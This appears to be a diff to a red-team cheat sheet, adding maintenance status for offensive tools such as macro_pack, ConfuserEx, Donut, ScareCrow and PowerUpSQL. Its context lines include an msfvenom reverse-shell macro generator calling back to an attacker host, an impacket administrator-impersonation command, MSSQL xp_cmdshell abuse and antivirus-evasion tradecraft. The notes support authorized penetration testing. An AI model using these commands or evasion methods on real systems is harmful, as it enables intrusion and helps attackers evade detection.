@@ -30,6 +30,8 @@ Client-side initial access — Office macros & friends
 # Generators (for AUTHORIZED tests):
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your-ip> LPORT=443 -f vba
 #   macro_pack -t WORD -o -G evil.doc        # obfuscates + builds the doc
+#     ⚠ ARCHIVED — read-only upstream, last push Aug 2024. Still builds working docs;
+#       nobody will fix it when the Office format or a signature moves.
 # Other vectors when macros are blocked:
 #   .hta via mshta | .lnk droppers | ISO/IMG container (strips MOTW) | OneNote embeds
 #   HTML smuggling (JS rebuilds the payload in-browser to dodge proxy AV)
@@ -61,8 +63,21 @@ Antivirus / EDR evasion — signature vs heuristic vs behavior
 # Custom shellcode runner is the workhorse (C#/C++): allocate memory, copy shellcode,
 # flip protections, execute via a thread/callback/fiber. Keep it off disk; load via
 # execute-assembly so no PE hits the filesystem.
-# Build/obfuscate helpers (lab + authorized use): ConfuserEx, Donut (PE->shellcode),
-# sRDI (DLL->reflective shellcode), ScareCrow / Nimcrypt-style loaders.
+# Build/obfuscate helpers (lab + authorized use), with the upstream FREEZE STATUS each
+# one carries — load-bearing here, because evasion tooling is the half that ages fastest:
+#   ConfuserEx  ⚠ use the mkaring fork (github.com/mkaring/ConfuserEx, alive into 2024).
+#               A bare "ConfuserEx" lands you in yck1509/ConfuserEx, ARCHIVED since 2019.
+#   Donut       (PE->shellcode) alive, commits into 2025 — and the ONE member here whose
+#               generator runs natively on Linux: apt-packaged, /usr/bin/donut. The rest
+#               of this list assumes the lab Windows VM.
+#   sRDI        (DLL->reflective shellcode) static — not archived, untouched since Nov 2023.
+#   ScareCrow   ⚠ ARCHIVED — read-only, last push Aug 2023. (Freeze.rs is a mention, not a
+#               successor: optiv/Freeze.rs is archived too and the live Tylous fork is thin.)
+#   Nimcrypt-style loaders — same class.
+# ARCHIVED does not mean unusable: these build against Windows formats that have not
+# changed, so they still produce working output. It means nobody is fixing them when a
+# format, a .NET runtime or a signature finally does move. Budget for REPLACING them, not
+# repairing them. Statuses tracked in install/offensive-packages.txt.
 # Test against a representative build OFFLINE — never upload samples to public
 # multi-scanners that share with vendors (it burns your tooling). Use a local lab.
 ////////////////////////////////////////
@@ -124,6 +139,10 @@ Advanced Active Directory — breaching a hardened domain
 impacket-getST -spn cifs/<target> -impersonate administrator -dc-ip <dc-ip> <domain>/<acct>:<pw>
 # MSSQL trust abuse — linked servers + EXECUTE AS to hop instances and run cmds:
 #   enable_xp_cmdshell; EXEC ('...') AT [LINKED]  (PowerUpSQL: Get-SQLServerLinkCrawl)
+#   PowerUpSQL is static — not archived, but no release was ever cut and the last
+#   functional commits are Aug 2024. Low impact: the Linux-native half is already on the
+#   box — impacket-mssqlclient (`enum_links` / `use_link`) and `nxc mssql` crawl linked
+#   servers from Kali. Maintained Windows-side analogue: skahwah/SQLRecon.
 # Cross-trust / cross-forest: SID history, foreign-group membership, trust-key abuse.
 # Token/privilege abuse for local SYSTEM: SeImpersonate -> the Potato family.
 ####
